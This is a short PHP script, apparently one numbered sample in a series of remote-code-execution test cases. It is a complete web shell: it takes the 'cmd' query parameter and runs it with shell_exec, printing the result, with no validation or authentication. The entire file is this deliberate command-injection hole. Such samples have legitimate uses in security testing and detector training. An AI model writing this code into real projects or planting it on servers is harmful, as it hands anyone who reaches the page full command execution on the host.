<?php
// RCE test variation #650
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>